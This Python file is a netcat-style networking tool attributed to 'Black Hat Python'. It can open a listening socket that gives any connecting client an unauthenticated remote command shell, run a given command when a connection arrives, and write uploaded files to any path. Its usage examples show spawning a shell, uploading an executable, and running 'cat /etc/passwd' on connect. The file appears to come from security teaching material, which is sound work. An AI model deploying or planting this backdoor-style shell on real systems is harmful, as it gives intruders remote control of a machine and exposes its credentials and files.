#!python3
'''
Black Hat Python's networking tool
'''

import getopt
import os
import socket
import sys
import subprocess
import threading

LISTEN = False
COMMAND = False
EXECUTE = ''
TARGET = ''
UPLOAD_DESTINATION = ''
PORT = 0

def usage():
    msg = (
        'Black Hat Python\'s Network Tool\n\n'
        'Usage: nc.py -t target_host -p port\n'
        '-l --listen\t\tlisten on [host]:[port] for connections\n'
        '-e --execute=file\texecute a given file upon connecting\n'
        '-c --commandshell\t\tinitialize a command shell\n'
        '-u --upload=dest\tupon receiving connection upload a file'
        ' and write to [dest]\n\n'
        'Examples:\n\n'
        'nc.py -t 192.168.0.1 -p 5555 -l -c\n'
        "nc.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe\n"
        "nc.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"\n"
        "echo 'ABCDEFGHI' | ./nc.py -t 192.168.11.12 -p 135\n"
    )
    print(msg)
    sys.exit(0)

def main():
    global COMMAND, EXECUTE, LISTEN, PORT, TARGET, UPLOAD_DESTINATION
    if len(sys.argv[1:]) < 1:
        usage()
    try:
        short = 'hle:t:p:cu:'
        long = [
            'help', 'listen', 'execute=', 'target=', 'port=', 'commandshell',
            'upload='
        ]
        optlist, arglist = getopt.getopt(sys.argv[1:], short, long)
    except getopt.GetoptError as e:
        print(e, file=sys.stderr)
        usage()

    for opt, arg in optlist:
        if opt in ['-h', '--help']:
            usage()
        elif opt in ['-l', '--listen']:
            LISTEN = True
        elif opt in ['-c', '--commandshell']:
            COMMAND = True
        elif opt in ['-e', '--execute']:
            EXECUTE = arg
        elif opt in ['-t', '--target']:
            TARGET = arg
        elif opt in ['-p', '--port']:
            PORT = int(arg)
        elif opt in ['-u', '--upload']:
            UPLOAD_DESTINATION = arg
    
    if (not LISTEN) and len(TARGET) and PORT > 0:
        buffer = ''
        if not os.isatty(0):
            buffer = sys.stdin.read()
        client_sender(buffer)
    
    if LISTEN:
        server_loop()

def client_sender(buffer: str):
    global PORT, TARGET
    # TODO: Add IPv6 Support
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((TARGET, PORT))
        if len(buffer):
            client.send(buffer.encode('UTF-8'))

        while True:
            recv_len = 1
            response = b''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if (recv_len < 4096):
                    break
        
            print(response.decode('UTF-8'))

            buffer = input('<BHP:#> ') + '\n'
            client.send(buffer.encode('UTF-8'))
    except Exception as err:
        print("[!] Connection error", file=sys.stderr)
        print(err, file=sys.stderr)
        client.close()

def server_loop():
    global PORT, TARGET
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((TARGET, PORT))
    server.listen(5)
    while True:
        new_client, addr = server.accept()
        print("[x] Connection received from %s:%i" % addr)
        client_thread = threading.Thread(
            target=client_handler, args=(new_client,)
        )
        client_thread.start()

def client_handler(client: socket.socket):
    global COMMAND, EXECUTE, UPLOAD_DESTINATION

    if UPLOAD_DESTINATION:
        file_buffer = b''

        while True:
            data = client.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        
        try:
            descriptor = open(UPLOAD_DESTINATION, 'wb')
            descriptor.write(file_buffer)
            descriptor.close()
        except Exception as err:
            client.send(b'[!] Failed to save file\r\n')
            client.send(str(err).encode('UTF-8'))
    
    if EXECUTE:
        output = run_command(EXECUTE)
        client.send(output)
    
    if COMMAND:
        # TODO: Get PS1 information
        
        while True:
            buffer = b''
            while (b'\n' not in buffer):
                buffer += client.recv(1024)
            
            response = run_command(buffer.decode('UTF-8'))
            client.send(response)

def run_command(cmd: str):
    command = cmd.rstrip()
    try:
        output = subprocess.check_output(
            command, stderr=subprocess.STDOUT, shell=True
        )
    except Exception as err:
        output = b"[!] Command failed to execute.\r\n"
        output += str(err).encode('UTF-8')

    
    return output

if __name__ == '__main__':
    main()
